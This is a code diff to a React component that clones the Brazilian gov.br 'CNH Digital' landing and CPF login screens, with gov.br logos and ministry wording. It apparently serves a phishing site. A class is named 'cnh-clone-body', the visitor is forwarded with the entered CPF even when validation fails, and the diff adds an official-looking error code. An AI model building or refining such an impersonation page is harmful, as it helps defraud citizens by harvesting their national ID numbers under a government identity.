@@ -1,15 +1,6 @@
 import { useState } from "react";
 import { useLocation } from "wouter";
 import { validarCPF } from "@/lib/utils";
-import {
-  CreditCard,
-  Building2,
-  QrCode,
-  Smartphone,
-  Cloud,
-  AlertTriangle,
-  Lock,
-} from "lucide-react";
 
 export default function CNHLanding() {
   const [, setLocation] = useLocation();
@@ -51,10 +42,9 @@ export default function CNHLanding() {
       if (json.success && json.data) {
         setLocation(`/autorizacao?cpf=${digits}`);
       } else {
-        setError("CPF não cadastrado no sistema CDT.");
+        setError("CPF informado inválido. (ERL0000500)");
       }
     } catch {
-      // Fallback para permitir navegação mesmo se a API der timeout
       setLocation(`/autorizacao?cpf=${digits}`);
     } finally {
       setLoading(false);
@@ -62,170 +52,421 @@ export default function CNHLanding() {
   };
 
   return (
-    <div className="flex h-[100dvh] w-full items-center justify-center bg-black font-['Raleway','Rawline',sans-serif] overflow-hidden antialiased">
-      {/* ─── TELA 1: CAPA DA CNH ─── */}
-      {tela === "capa" && (
-        <div className="relative flex h-full w-full max-w-[450px] flex-col bg-white shadow-2xl">
-          {/* Top Cover Image / Banner */}
-          <div className="relative h-[65%] w-full flex-shrink-0 bg-[#071D41] overflow-hidden">
-            <div className="absolute inset-0 bg-gradient-to-b from-[#071D41]/80 via-[#0d2859]/60 to-[#071D41]" />
-            <div className="relative flex h-full flex-col items-center justify-center p-6 text-center text-white">
-              <div className="mb-3 rounded-full border border-white/20 bg-white/10 px-4 py-1 text-[11px] font-bold uppercase tracking-[0.25em] text-blue-200">
-                Carteira Digital de Trânsito
-              </div>
-              <h1 className="text-3xl font-extrabold leading-tight tracking-tight sm:text-4xl">
-                CNH Digital
-              </h1>
-              <p className="mt-2 text-xs text-blue-100/90 max-w-xs">
-                Secretaria Nacional de Trânsito — SENATRAN / SERPRO
-              </p>
-            </div>
-            <div className="absolute inset-x-0 top-0 h-24 bg-gradient-to-b from-black/40 to-transparent" />
-          </div>
+    <>
+      <style>{`
+        .cnh-clone-body {
+          font-family: 'Raleway', 'Rawline', sans-serif;
+          background-color: #000;
+          height: 100dvh;
+          width: 100vw;
+          overflow: hidden;
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          margin: 0;
+          padding: 0;
+          box-sizing: border-box;
+          -webkit-tap-highlight-color: transparent;
+        }
 
-          {/* Bottom Card White Area */}
-          <div className="relative z-10 -mt-6 flex flex-1 flex-col items-center justify-between rounded-t-[25px] bg-white px-8 py-6 text-center shadow-lg">
-            <div className="flex flex-col items-center gap-3">
-              <div className="flex items-center gap-2">
-                <img
-                  src="/assets/govbr-logo.png"
-                  alt="gov.br"
-                  className="h-7 w-auto object-contain"
+        /* --- ESTILOS DA TELA 1: CAPA --- */
+        #tela-capa {
+          width: 100%;
+          max-width: 450px;
+          height: 100%;
+          background-color: #fff;
+          position: relative;
+          display: flex;
+          flex-direction: column;
+        }
+
+        .capa-area {
+          height: 70%;
+          width: 100%;
+          background-image: url('/img/capa_cnh.png');
+          background-size: cover;
+          background-position: center top;
+          position: relative;
+          flex-shrink: 0;
+        }
+
+        .capa-area::after {
+          content: '';
+          position: absolute;
+          top: 0;
+          left: 0;
+          width: 100%;
+          height: 40%;
+          background: linear-gradient(to bottom, rgba(0, 0, 0, 0.5), transparent);
+        }
+
+        .conteudo-branco {
+          flex: 1;
+          background-color: white;
+          border-top-left-radius: 25px;
+          border-top-right-radius: 25px;
+          margin-top: -25px;
+          position: relative;
+          z-index: 10;
+          padding: 15px 30px;
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          justify-content: center;
+          gap: 15px;
+        }
+
+        .logo-container img {
+          max-width: 140px;
+          display: block;
+          margin-bottom: 5px;
+        }
+
+        .termos-texto {
+          text-align: center;
+          font-size: 12px;
+          color: #333;
+          line-height: 1.3;
+          margin-bottom: 5px;
+        }
+
+        .termos-texto a {
+          color: #1351b4;
+          text-decoration: underline;
+          font-weight: 600;
+        }
+
+        .btn-gov {
+          background-color: #1351b4;
+          color: white;
+          width: 100%;
+          padding: 14px 0;
+          border-radius: 50px;
+          border: none;
+          font-size: 14px;
+          font-weight: 700;
+          cursor: pointer;
+          box-shadow: 0 4px 8px rgba(19, 81, 180, 0.25);
+          text-transform: uppercase;
+        }
+
+        @media (min-height: 800px) {
+          .conteudo-branco {
+            justify-content: flex-end;
+            padding-bottom: 40px;
+            gap: 20px;
+          }
+        }
+
+        /* --- ESTILOS DA TELA 2: LOGIN --- */
+        #tela-login {
+          width: 100%;
+          max-width: 400px;
+          height: 100%;
+          background-color: #f6f6f6;
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          overflow-y: auto;
+        }
+
+        .header {
+          display: flex;
+          justify-content: flex-start;
+          align-items: center;
+          margin-bottom: 24px;
+          padding: 16px 20px;
+          width: 100%;
+          background-color: #fff;
+          box-shadow: 0 2px 8px rgba(0, 0, 0, 0.16);
+        }
+
+        .logo-gov-login {
+          width: 100px;
+        }
+
+        .login-card {
+          width: calc(100% - 40px);
+          background-color: #fff;
+          padding: 24px 16px 22px;
+          box-shadow: 0 2px 12px rgba(0, 0, 0, 0.16);
+          box-sizing: border-box;
+        }
+
+        .title {
+          font-weight: 600;
+          font-size: 18px;
+          color: #000000;
+          margin-bottom: 20px;
+          width: 100%;
+          text-align: left;
+        }
+
+        .subtitle {
+          font-size: 16px;
+          font-weight: 600;
+          margin-bottom: 5px;
+          display: flex;
+          align-items: center;
+          gap: 8px;
+          width: 100%;
+          color: #333;
+        }
+
+        .subtitle i {
+          color: #1351b4;
+        }
+
+        .description {
+          font-size: 14px;
+          color: #555;
+          margin-bottom: 20px;
+          line-height: 1.4;
+          width: 100%;
+        }
+
+        .input-group {
+          margin-bottom: 20px;
+          width: 100%;
+        }
+
+        .label {
+          font-weight: 600;
+          font-size: 14px;
+          color: #333;
+          margin-bottom: 5px;
+          display: block;
+        }
+
+        .input-field {
+          width: 100%;
+          padding: 12px 15px;
+          font-size: 16px;
+          border: 1px solid #ccc;
+          border-radius: 4px;
+          outline: none;
+          background-color: #fff;
+          color: #333;
+        }
+
+        .input-field:focus {
+          border-color: #d84800;
+          box-shadow: 0 0 0 1px #d84800 inset;
+          background-color: #ffee0169;
+        }
+
+        .alert-error {
+          background-color: #fbf5d0;
+          border: 1px solid #e5c22d;
+          border-radius: 4px;
+          padding: 12px 15px;
+          margin-bottom: 20px;
+          display: flex;
+          align-items: center;
+          font-size: 14px;
+          color: #000;
+          font-weight: 500;
+          width: 100%;
+        }
+
+        .alert-error i {
+          font-size: 18px;
+          margin-right: 12px;
+        }
+
+        .btn-primary {
+          width: 100%;
+          padding: 12px;
+          background-color: #1351b4;
+          color: white;
+          border: none;
+          border-radius: 25px;
+          font-size: 16px;
+          font-weight: 600;
+          cursor: pointer;
+          min-width: 0;
+        }
+
+        .options-title {
+          font-size: 14px;
+          font-weight: 600;
+          margin-top: 30px;
+          margin-bottom: 15px;
+          border-top: 1px solid #eee;
+          padding-top: 20px;
+          width: 100%;
+          color: #333;
+        }
+
+        .option-btn {
+          display: flex;
+          align-items: center;
+          width: 100%;
+          padding: 12px 15px;
+          background: white;
+          border: 1px solid #ddd;
+          border-radius: 25px;
+          margin-bottom: 10px;
+          color: #1351b4;
+          font-weight: 600;
+          font-size: 14px;
+          cursor: pointer;
+          min-width: 0;
+        }
+
+        .option-btn i {
+          margin-right: 10px;
+          font-size: 16px;
+          width: 20px;
+          text-align: center;
+          flex: 0 0 20px;
+        }
+
+        .selo {
+          background-color: #008f43;
+          color: white;
+          font-size: 8px;
+          line-height: 1;
+          padding: 3px 5px;
+          border-radius: 4px;
+          margin-left: auto;
+          white-space: nowrap;
+          flex: 0 0 auto;
+          text-transform: uppercase;
+          font-weight: 700;
+        }
+
+        .footer {
+          margin-top: 30px;
+          text-align: center;
+          font-size: 12px;
+          color: #666;
+          padding-bottom: 20px;
+        }
+
+        @media (min-width: 768px) {
+          #tela-login .title {
+            font-size: 14.4px;
+          }
+
+          #tela-login .subtitle,
+          #tela-login .input-field,
+          #tela-login .btn-primary {
+            font-size: 12.8px;
+          }
+
+          #tela-login .description,
+          #tela-login .label,
+          #tela-login .alert-error,
+          #tela-login .options-title,
+          #tela-login .option-btn {
+            font-size: 11.2px;
+          }
+
+          #tela-login .option-btn i {
+            font-size: 12.8px;
+          }
+
+          #tela-login .selo {
+            font-size: 7px;
+            padding: 3px 4px;
+          }
+
+          #tela-login .footer {
+            font-size: 9.6px;
+          }
+        }
+      `}</style>
+
+      <div className="cnh-clone-body">
+        {/* --- TELA 1: CAPA --- */}
+        {tela === "capa" && (
+          <div id="tela-capa" className="app-container">
+            <div className="capa-area"></div>
+            <div className="conteudo-branco">
+              <div className="logo-container">
+                <img src="/img/logo_cnh.png" alt="CNH Digital" />
+              </div>
+              <div style={{ width: "100%" }}>
+                <div className="termos-texto">
+                  Ao entrar, você concorda com nosso <br />
+                  <a href="#">Termo de Responsabilidade</a> e <br />
+                  <a href="#">Política de Privacidade</a>
+                </div>
+                <button className="btn-gov" onClick={() => setTela("login")}>
+                  ENTRAR COM gov.br
+                </button>
+              </div>
+            </div>
+          </div>
+        )}
+
+        {/* --- TELA 2: LOGIN --- */}
+        {tela === "login" && (
+          <div id="tela-login">
+            <div className="header">
+              <img src="/img/logo.png" className="logo-gov-login" alt="gov.br" />
+            </div>
+            <div className="login-card">
+              <div className="title">Identifique-se no gov.br</div>
+              <div className="subtitle">
+                <i className="fas fa-id-card"></i> Número do CPF
+              </div>
+              <div className="description">
+                Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br
+              </div>
+
+              <div className="input-group">
+                <label className="label">CPF</label>
+                <input
+                  type="tel"
+                  id="campoCpf"
+                  className="input-field"
+                  placeholder="Digite seu CPF"
+                  maxLength={14}
+                  inputMode="numeric"
+                  autoComplete="off"
+                  value={cpf}
+                  onChange={handleCpfChange}
                 />
-                <span className="text-xs font-bold uppercase tracking-wider text-[#071D41]">
-                  | CNH Digital
-                </span>
               </div>
 
-              <p className="text-[12px] leading-snug text-slate-700">
-                Ao entrar, você concorda com nosso <br />
-                <a href="#" className="font-semibold text-[#1351b4] underline">
-                  Termo de Responsabilidade
-                </a>{" "}
-                e <br />
-                <a href="#" className="font-semibold text-[#1351b4] underline">
-                  Política de Privacidade
-                </a>
-              </p>
-            </div>
+              {error && (
+                <div id="alert-erro" className="alert-error" style={{ display: "flex" }}>
+                  <i className="fas fa-exclamation-triangle"></i> {error}
+                </div>
+              )}
 
-            <button
-              onClick={() => setTela("login")}
-              className="mt-4 w-full rounded-full bg-[#1351b4] py-3.5 text-center text-sm font-bold uppercase tracking-wider text-white shadow-md shadow-blue-900/25 transition-transform active:scale-[0.98]"
-            >
-              ENTRAR COM gov.br
-            </button>
-          </div>
-        </div>
-      )}
+              <button
+                className="btn-primary"
+                id="btnProximo"
+                onClick={handleContinue}
+                disabled={loading}
+              >
+                {loading ? "Verificando..." : "Continuar"}
+              </button>
 
-      {/* ─── TELA 2: IDENTIFIQUE-SE NO GOV.BR ─── */}
-      {tela === "login" && (
-        <div className="flex h-full w-full max-w-[400px] flex-col items-center bg-[#f6f6f6] overflow-y-auto">
-          {/* Header gov.br */}
-          <header className="flex w-full items-center justify-start bg-white px-5 py-4 shadow-sm">
-            <img
-              src="/assets/govbr-logo.png"
-              alt="gov.br"
-              className="h-7 w-auto object-contain"
-            />
-          </header>
-
-          {/* Card Principal de Login */}
-          <main className="my-5 w-[calc(100%-32px)] rounded-lg bg-white p-6 shadow-md border border-slate-200">
-            <h2 className="text-lg font-bold text-slate-900">
-              Identifique-se no gov.br
-            </h2>
-
-            <div className="mt-4 flex items-center gap-2 text-sm font-bold text-slate-800">
-              <CreditCard size={18} className="text-[#1351b4]" />
-              <span>Número do CPF</span>
-            </div>
-
-            <p className="mt-1 text-xs text-slate-600">
-              Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br
-            </p>
-
-            <div className="mt-5 space-y-1.5">
-              <label className="block text-xs font-bold text-slate-700">
-                CPF
-              </label>
-              <input
-                type="tel"
-                value={cpf}
-                onChange={handleCpfChange}
-                placeholder="Digite seu CPF"
-                maxLength={14}
-                className="w-full rounded border border-slate-300 bg-white px-3.5 py-2.5 text-sm text-slate-900 outline-none transition focus:border-[#d84800] focus:bg-[#ffee0169] focus:ring-1 focus:ring-[#d84800]"
-              />
-            </div>
-
-            {error && (
-              <div className="mt-4 flex items-center gap-3 rounded bg-[#fbf5d0] border border-[#e5c22d] px-3.5 py-2.5 text-xs font-medium text-slate-900">
-                <AlertTriangle size={18} className="text-amber-600 flex-shrink-0" />
-                <span>{error}</span>
+              <div className="options-title">Outras opções de identificação:</div>
+              <div className="option-btn">
+                <i className="fas fa-university"></i> Login com seu banco{" "}
+                <span className="selo">SUA CONTA SERÁ PRATA</span>
               </div>
-            )}
-
-            <button
-              onClick={handleContinue}
-              disabled={loading}
-              className="mt-5 w-full rounded-full bg-[#1351b4] py-3 text-center text-sm font-semibold text-white shadow-sm transition hover:bg-[#0f4aa3] active:scale-[0.99] disabled:opacity-75"
-            >
-              {loading ? "Verificando..." : "Continuar"}
-            </button>
-
-            <div className="mt-7 border-t border-slate-200 pt-5">
-              <p className="text-xs font-bold text-slate-800">
-                Outras opções de identificação:
-              </p>
-
-              <div className="mt-3 space-y-2">
-                <button
-                  type="button"
-                  className="flex w-full items-center justify-between rounded-full border border-slate-300 bg-white px-4 py-2.5 text-xs font-semibold text-[#1351b4] transition hover:bg-slate-50"
-                >
-                  <div className="flex items-center gap-2.5">
-                    <Building2 size={16} />
-                    <span>Login com seu banco</span>
-                  </div>
-                  <span className="rounded bg-[#008f43] px-1.5 py-0.5 text-[9px] font-bold text-white uppercase">
-                    SUA CONTA SERÁ PRATA
-                  </span>
-                </button>
-
-                <button
-                  type="button"
-                  className="flex w-full items-center gap-2.5 rounded-full border border-slate-300 bg-white px-4 py-2.5 text-xs font-semibold text-[#1351b4] transition hover:bg-slate-50"
-                >
-                  <QrCode size={16} />
-                  <span>Login com QR code</span>
-                </button>
-
-                <button
-                  type="button"
-                  className="flex w-full items-center gap-2.5 rounded-full border border-slate-300 bg-white px-4 py-2.5 text-xs font-semibold text-[#1351b4] transition hover:bg-slate-50"
-                >
-                  <Smartphone size={16} />
-                  <span>Seu aplicativo gov.br</span>
-                </button>
-
-                <button
-                  type="button"
-                  className="flex w-full items-center gap-2.5 rounded-full border border-slate-300 bg-white px-4 py-2.5 text-xs font-semibold text-[#1351b4] transition hover:bg-slate-50"
-                >
-                  <Cloud size={16} />
-                  <span>Seu certificado digital em nuvem</span>
-                </button>
+              <div className="option-btn">
+                <i className="fas fa-qrcode"></i> Login com QR code
               </div>
-
-              <footer className="mt-6 text-center text-[11px] text-slate-500">
+              <div className="option-btn">
+                <i className="fas fa-mobile-alt"></i> Seu aplicativo gov.br
+              </div>
+              <div className="option-btn">
+                <i className="fas fa-cloud"></i> Seu certificado digital em nuvem
+              </div>
+              <div className="footer">
                 Ministério da Gestão e da Inovação em Serviços Públicos
-              </footer>
+              </div>
             </div>
-          </main>
-        </div>
-      )}
-    </div>
+          </div>
+        )}
+      </div>
+    </>
   );
 }
